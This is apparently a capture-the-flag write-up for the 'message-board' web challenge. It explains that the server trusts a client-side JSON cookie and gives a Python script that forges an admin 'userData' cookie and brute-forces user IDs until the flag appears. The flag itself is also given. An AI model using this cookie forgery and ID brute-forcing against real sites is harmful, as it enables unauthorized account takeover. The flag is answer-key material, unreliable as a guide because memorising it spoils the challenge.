*Your employer, LameCompany, has lots of gossip on its company message board: message-board.hsc.tf. You, Kupatergent, are able to access some of the tea, but not all of it! Unsatisfied, you figure that the admin user must have access to ALL of the tea. Your goal is to find the tea you've been missing out on.*

*Your login credentials: username: kupatergent password: gandal*

*Server code is attached (slightly modified).*

<br>
From the source code we can find, that the flag is printed, if the json cookie userData contains userID, which corresponds to the admin's id. We can brute force this with the following script:

```python
import requests

url = "https://message-board.hsc.tf/"

cookie = 'j:{"userID":"0","username":"admin"}'

for i in range(238, 1000):
    cookie = 'j:{"userID":"' + str(i) + '","username":"admin"}'

    r=requests.get(url, cookies={"userData":cookie})

    print(i, r.text[1413:1418], r.text[1428:1478].replace("\n", ""))
```

The line different from the others contains the flag `flag{y4m_y4m_c00k13s}`.